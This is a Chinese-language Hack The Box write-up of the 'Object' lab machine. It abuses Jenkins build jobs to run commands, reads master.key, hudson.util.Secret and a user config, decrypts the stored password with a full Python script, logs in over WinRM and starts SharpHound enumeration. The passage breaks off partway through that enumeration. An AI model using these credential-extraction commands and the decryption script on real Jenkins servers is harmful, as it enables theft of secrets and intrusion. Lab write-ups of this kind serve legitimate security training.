---
title: HTB-Object Writeup
date: 2026-04-01T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - Windows
  - Jenkins
  - BloodHound
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ sudo nmap --min-rate 10000 -p- 10.129.96.147 -oA Nmap/ports
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 03:39 -0400
Nmap scan report for 10.129.96.147
Host is up (0.084s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ sudo nmap -sT -sC -sV -O -p80,5985,8080 10.129.96.147
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 03:39 -0400
Nmap scan report for 10.129.96.147
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
| http-methods: 
|_  Potentially risky methods: TRACE
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.97 seconds

```

根据 Nmap 的扫描结果，这是一台 Windows 的靶机，开放 Winrm 端口与两个 Web 端口。

## Web 渗透

访问 80 端口，提示我们可以点击 `automation` 跳转服务。

![](Pasted%20image%2020260503154420.png)

底部暴露一个用户，存储下来做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ cat users.txt    
ideas@object.htb
```

点击 `automation` 跳转到 8080 端口，需要解析域名。

![](Pasted%20image%2020260503154549.png)

解析域名后重新访问。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ sudo vim /etc/hosts                                  
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ tail -n 1 /etc/hosts
10.129.96.147 object.htb
```

8080 端口运行的是一个 Jenkins 服务，可以创建用户。

![](Pasted%20image%2020260503154720.png)

创建一个用户 `enil`。

![](Pasted%20image%2020260503155114.png)

登录进后台。

![](Pasted%20image%2020260503155133.png)

在 `New Item` 中可以创建项目，创建一个项目。

![](Pasted%20image%2020260503155805.png)

选择 `Execute Windows batch command`。

![](Pasted%20image%2020260503160012.png)

执行一个最小化的 payload 验证是否可以执行。

![](Pasted%20image%2020260503160130.png)

选择 `Build periodically` 每分钟执行一次命令。

![](Pasted%20image%2020260503161312.png)

可以在 Build History 中查看执行结果。

![](Pasted%20image%2020260503161339.png)

可以看到 `whoami` 和 `hostname` 都执行成功了。

![](Pasted%20image%2020260503161352.png)

在 Kali 中准备好 `nc64.exe`

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ ls -liah nc64.exe   
2782078 -rwxrwxr-x 1 kali kali 45K May  3 04:17 nc64.exe
```

尝试下载并反向连接至靶机。

![](Pasted%20image%2020260503162445.png)

失败了。

![](Pasted%20image%2020260503170218.png)

尝试读取 user flag。

![](Pasted%20image%2020260503170242.png)

![](Pasted%20image%2020260503170130.png)

尝试枚举基本信息。

![](Pasted%20image%2020260503172206.png)

![](Pasted%20image%2020260503172135.png)

注意到执行命令时先启动的命令为 `cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins9169294061165130695.bat` ，尝试枚举 `C:\Users\oliver\AppData\Local`。

![](Pasted%20image%2020260503175343.png)

```bash
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user
[Get_user] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins1290230096094190728.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>dir c:\Users\oliver\Appdata\local 
 Volume in drive C has no label.
 Volume Serial Number is 212C-60B7

 Directory of c:\Users\oliver\Appdata\local

10/20/2021  10:08 PM    <DIR>          .
10/20/2021  10:08 PM    <DIR>          ..
10/20/2021  09:55 PM    <DIR>          ConnectedDevicesPlatform
10/22/2021  07:38 AM    <DIR>          Jenkins
10/21/2021  03:41 AM    <DIR>          Microsoft
10/20/2021  09:56 PM    <DIR>          Packages
05/03/2026  02:52 AM    <DIR>          Temp
10/20/2021  09:56 PM    <DIR>          VirtualStore
               0 File(s)              0 bytes
               8 Dir(s)   4,633,743,360 bytes free

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>dir c:\Users\oliver\Appdata\local\jenkins\ 
 Volume in drive C has no label.
 Volume Serial Number is 212C-60B7

 Directory of c:\Users\oliver\Appdata\local\jenkins

10/22/2021  07:38 AM    <DIR>          .
10/22/2021  07:38 AM    <DIR>          ..
05/03/2026  02:51 AM    <DIR>          .jenkins
05/03/2026  02:44 AM                 4 jenkins.pid
10/20/2021  10:08 PM    <DIR>          war
               1 File(s)              4 bytes
               4 Dir(s)   4,633,743,360 bytes free

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>dir c:\Users\oliver\Appdata\local\jenkins\.jenkins 
 Volume in drive C has no label.
 Volume Serial Number is 212C-60B7

 Directory of c:\Users\oliver\Appdata\local\jenkins\.jenkins

05/03/2026  02:51 AM    <DIR>          .
05/03/2026  02:51 AM    <DIR>          ..
05/03/2026  02:45 AM                 0 .lastStarted
11/10/2021  03:20 AM                41 .owner
05/03/2026  02:45 AM             2,505 config.xml
05/03/2026  02:45 AM               156 hudson.model.UpdateCenter.xml
10/20/2021  10:13 PM               375 hudson.plugins.git.GitTool.xml
10/20/2021  10:08 PM             1,712 identity.key.enc
05/03/2026  02:45 AM                 5 jenkins.install.InstallUtil.lastExecVersion
10/20/2021  10:14 PM                 5 jenkins.install.UpgradeWizard.state
10/20/2021  10:14 PM               179 jenkins.model.JenkinsLocationConfiguration.xml
10/20/2021  10:21 PM               357 jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
10/20/2021  10:21 PM               169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
10/20/2021  10:21 PM               162 jenkins.security.UpdateSiteWarningsConfiguration.xml
10/20/2021  10:08 PM               171 jenkins.telemetry.Correlator.xml
05/03/2026  02:47 AM    <DIR>          jobs
10/20/2021  10:19 PM    <DIR>          logs
05/03/2026  02:45 AM               907 nodeMonitors.xml
10/20/2021  10:08 PM    <DIR>          nodes
10/20/2021  10:12 PM    <DIR>          plugins
05/03/2026  02:51 AM               129 queue.xml
10/20/2021  10:28 PM               129 queue.xml.bak
10/20/2021  10:08 PM                64 secret.key
10/20/2021  10:08 PM                 0 secret.key.not-so-secret
10/20/2021  10:26 PM    <DIR>          secrets
10/25/2021  10:31 PM    <DIR>          updates
10/20/2021  10:08 PM    <DIR>          userContent
05/03/2026  02:47 AM    <DIR>          users
10/20/2021  10:13 PM    <DIR>          workflow-libs
05/03/2026  02:49 AM    <DIR>          workspace
              18 File(s)          7,066 bytes
              12 Dir(s)   4,633,743,360 bytes free

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users 
 Volume in drive C has no label.
 Volume Serial Number is 212C-60B7

 Directory of c:\Users\oliver\Appdata\local\jenkins\.jenkins\users

05/03/2026  02:47 AM    <DIR>          .
05/03/2026  02:47 AM    <DIR>          ..
10/21/2021  02:22 AM    <DIR>          admin_17207690984073220035
05/03/2026  02:47 AM    <DIR>          enil_6662672245552651695
05/03/2026  02:47 AM               402 users.xml
               1 File(s)            402 bytes
               4 Dir(s)   4,633,739,264 bytes free

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>dir c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035 
 Volume in drive C has no label.
 Volume Serial Number is 212C-60B7

 Directory of c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035

10/21/2021  02:22 AM    <DIR>          .
10/21/2021  02:22 AM    <DIR>          ..
10/21/2021  02:22 AM             3,186 config.xml
               1 File(s)          3,186 bytes
               2 Dir(s)   4,633,739,264 bytes free

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>exit 0 
Finished: SUCCESS
```

发现一个凭据。

```bash
<username>oliver</username>
<password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
```

继续枚举。

![](Pasted%20image%2020260503175810.png)

```bash
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user
[Get_user] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins14210865758767335375.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>dir c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets 
 Volume in drive C has no label.
 Volume Serial Number is 212C-60B7

 Directory of c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets

10/20/2021  10:26 PM    <DIR>          .
10/20/2021  10:26 PM    <DIR>          ..
10/20/2021  10:08 PM    <DIR>          filepath-filters.d
10/20/2021  10:26 PM               272 hudson.console.AnnotatedLargeText.consoleAnnotator
10/20/2021  10:26 PM                32 hudson.model.Job.serverCookie
10/20/2021  10:15 PM               272 hudson.util.Secret
10/20/2021  10:08 PM                32 jenkins.model.Jenkins.crumbSalt
10/20/2021  10:08 PM               256 master.key
10/20/2021  10:08 PM               272 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY
10/20/2021  10:21 PM                 5 slave-to-master-security-kill-switch
10/20/2021  10:08 PM    <DIR>          whitelisted-callables.d
               7 File(s)          1,141 bytes
               4 Dir(s)   4,722,810,880 bytes free

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>type c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key 
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>powershell -nop -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret'))" 
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\Get_user>exit 0 
Finished: SUCCESS


```

将 `master.key` 与 `hudson.util.Secret` 的内容保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ cat master.key      
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ echo 'gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=' | base64 -d > hudson.util.Secret

┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ file hudson.util.Secret           
hudson.util.Secret: data
```

制作一个脚本解密。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ chmod +x decrypt.py   
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ cat decrypt.py 
#!/usr/bin/env python3
import sys, base64
from hashlib import sha256
from Crypto.Cipher import AES

MAGIC = b"::::MAGIC::::"

def decrypt(secret_b64, master_key_path, hudson_secret_path):
    with open(master_key_path, "rb") as f:
        master_key = f.read()
    with open(hudson_secret_path, "rb") as f:
        hudson_secret = f.read()

    # 第一层：用 SHA-256(master.key)[:16] 解 hudson.util.Secret
    derived = sha256(master_key).digest()[:16]
    decrypted_hudson = AES.new(derived, AES.MODE_ECB).decrypt(hudson_secret)
    if MAGIC not in decrypted_hudson:
        raise Exception("hudson.util.Secret 解密失败 —— master.key 不对？")

    # 取出真正的机密性密钥（前 16 字节）
    confidentiality_key = decrypted_hudson[:16]

    # 第二层：解开实际的凭据
    blob = base64.b64decode(secret_b64.strip("{}"))
    if blob[0] != 1:
        raise Exception("不是新格式 secret")
    iv_len   = int.from_bytes(blob[1:5], "big")
    data_len = int.from_bytes(blob[5:9], "big")
    iv       = blob[9:9+iv_len]
    data     = blob[9+iv_len:9+iv_len+data_len]

    plain = AES.new(confidentiality_key, AES.MODE_CBC, iv).decrypt(data)
    return plain[:-plain[-1]].decode()  # 去 PKCS7 padding

if __name__ == "__main__":
    print(decrypt(sys.argv[1], sys.argv[2], sys.argv[3]))
```

得到密码 `c1cdfun_d2434`。

```bash
┌──(venv)─(kali㉿kali)-[~/Work/Kali/Object]
└─$ python3 decrypt.py '{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}' master.key hudson.util.Secret
c1cdfun_d2434
```

保存下来做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ cat users_pass.txt 
oliver:c1cdfun_d2434
```

验证凭据的有效性，可以登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ nxc winrm object.htb -u oliver -p 'c1cdfun_d2434'
WINRM       10.129.96.147   5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.96.147   5985   JENKINS          [+] object.local\oliver:c1cdfun_d2434 (Pwn3d!)

```

## 提权至 smith

使用 Bloodhound 收集信息，失败。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ bloodhound-python -c All -u oliver -p 'c1cdfun_d2434' -ns 10.129.96.147 -d object.htb -dc object.htb --zip                                                                                                   
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Traceback (most recent call last):
  File "/usr/bin/bloodhound-python", line 33, in <module>
    sys.exit(load_entry_point('bloodhound==1.9.0', 'console_scripts', 'bloodhound-python')())
             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 314, in main
    ad.dns_resolve(domain=args.domain, options=args)
    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodhound/ad/domain.py", line 749, in dns_resolve
    q = self.dnsresolver.query(query, 'SRV', tcp=self.dns_tcp)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1363, in query
    return self.resolve(
           ~~~~~~~~~~~~^
        qname,
        ^^^^^^
    ...<7 lines>...
        True,
        ^^^^^
    )
    ^
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1320, in resolve
    timeout = self._compute_timeout(start, lifetime, resolution.errors)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1076, in _compute_timeout
    raise LifetimeTimeout(timeout=duration, errors=errors)
dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.104 seconds: Server Do53:10.129.96.147@53 answered The DNS operation timed out.

```

准备 `SharpHound`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Object]
└─$ ls -liah SharpHound.exe 
2794138 -rw-rw-r-- 1 kali kali 1.3M May  6 01:01 SharpHound.exe
```

上传至靶机。

```bash
*Evil-WinRM* PS C:\programdata\apps> upload SharpHound.exe
                                        
Info: Uploading /home/kali/Work/Kali/Object/SharpHound.exe to C:\programdata\apps\SharpHound.exe
                                        
Data: 1802240 bytes of 1802240 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/5/2026   9:03 PM        1351680 SharpHound.exe
```

收集信息。

```bash
*Evil-WinRM* PS C:\programdata\apps> .\SharpHound.exe -c All --zipfilename SharpHound
2026-05-05T21:04:30.1244315-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-05-05T21:04:30.1556843-07:00|INFORMATION|SharpHound Version: 2.12.0.0
2026-05-05T21:04:30.1556843-07:00|INFORMATION|SharpHound Common Version: 4.6.1.0
2026-05-05T21:04:30.3900557-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-05-05T21:04:30.4369336-07:00|INFORMATION|Initializing SharpHound at 9:04 PM on 5/5/2026
2026-05-05T21:04:30.4838004-07:00|INFORMATION|Resolved current domain to object.local
2026-05-05T21:04:30.6713034-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-05-05T21:04:30.8119438-07:00|INFORMATION|Beginning LDAP search for object.local
2026-05-05T21:04:30.8119438-07:00|INFORMATION|Collecting AdminSDHolder data for object.local
2026-05-05T21:04:30.8900546-07:00|INFORMATION|AdminSDHolder ACL hash C1DB7540904333F6766FD3C57019DBF324DFCF81 calculated for object.local.
2026-05-05T21:04:30.9994258-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:30.9994258-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.0306784-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.0306784-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.0306784-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.0306784-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.0463018-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.0463018-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.2338050-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.2338050-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.2806812-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.2806812-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3119266-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3275486-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3275486-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3275486-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3431725-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3431725-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3431725-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3431725-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3588008-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3588008-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3588008-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3744282-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3744282-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3744282-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3744282-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3900514-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.3900514-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.4681838-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.4681838-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.5150521-07:00|INFORMATION|Beginning LDAP search for object.local Configuration NC
2026-05-05T21:04:31.5462998-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7337961-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7337961-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7337961-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7337961-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7494206-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7650471-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7650471-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7650471-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7650471-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:31.7650471-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for OBJECT.LOCAL
2026-05-05T21:04:32.8275496-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-4088429403-1159899800-2753317549-1104.
2026-05-05T21:04:32.9525468-07:00|INFORMATION|Producer has finished, closing LDAP channel
2026-05-05T21:04:32.9681703-07:00|INFORMATION|LDAP channel closed, waiting for consumers
